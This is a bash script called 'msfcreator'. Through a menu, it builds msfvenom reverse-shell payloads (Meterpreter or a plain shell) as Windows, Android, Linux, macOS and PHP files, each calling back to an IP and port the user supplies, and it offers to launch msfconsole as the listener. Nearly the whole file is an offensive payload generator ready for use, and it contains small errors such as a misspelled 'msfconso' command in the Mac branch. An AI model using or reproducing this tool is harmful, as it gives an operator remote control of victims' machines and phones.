clear

#!/bin/bash

sudo apt install figlet -y
me=`whoami`
clear
figlet Hello $me!
sleep 2
while :
do
clear
echo
echo
echo 
echo
figlet msfcreator
echo
echo
echo
echo
echo 1. Windows
echo 
echo 2. Android
echo 
echo 3. Linux
echo
echo 4. Mac
echo
echo 5. PHP
echo
echo '# To exit click ctrl + c'
echo
#!/bin/bash
echo option:
read MENU
case $MENU in
    
        
    1)
        echo 'your ip:'
        read a
        echo 'local port:'
        read b
        echo 'name of the file without .exe:'
        read c
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$a LPORT=$b -f exe>$c.exe
        echo 'Would you like to open msfconsole to connect [y/n] ?'
         read d
         e=y
        if [[ $d == $e ]]
        then
        msfconsole 
        fi
        echo $c;;
               
    2)
        me=`whoami`
        echo 'your ip:'
        read a
        echo 'local port:'
        read b
        echo 'name of the file without .exe:'
        echo $me
        read c
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$a LPORT=$b R>/home/$me/$c.apk
       echo 'Would you like to open msfconsole to connect [y/n] ?'
         read d
         e=y
        if [[ $d == $e ]]
        then
        msfconsole 
        fi                                                                                                             
        echo $c;;
    3)
        echo 'your ip:'
        read a
        echo 'local port:'
        read b
        echo 'name of the file without .exe:'
        read c
        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$a LPORT=$b -f elf > $c.elf
        echo 'Would you like to open msfconsole to connect [y/n] ?'
         read d
         e=y
        if [[ $d == $e ]]
        then
        msfconsole
        fi                                                  
        echo $c;;   
    4) 
        echo 'your ip:'
        read a
        echo 'local port:'
        read b
        echo 'name of the file without .exe:'
        read c
        msfvenom -p osx/x86/shell_reverse_tcp LHOST=$a LPORT=$b -f macho > $c.macho
        echo 'Would you like to open msfconsole to connect [y/n] ?'
         read d
         e=y
        if [[ $d == $e ]]
        then
        msfconso 
        fi
        echo $c;;
    5)
        echo 'your ip:'
        read a
        echo 'local port:'
        read b
        echo 'name of the file without .exe:'
        read c
        msfvenom -p php/meterpreter_reverse_tcp LHOST=$a LPORT=$b -f raw > $c.php
        echo 'Would you like to open msfconsole to connect [y/n] ?'
         read d
         e=y
        if [[ $d == $e ]]
        then 
        msfconsole
        fi
        echo $c;;
esac
done

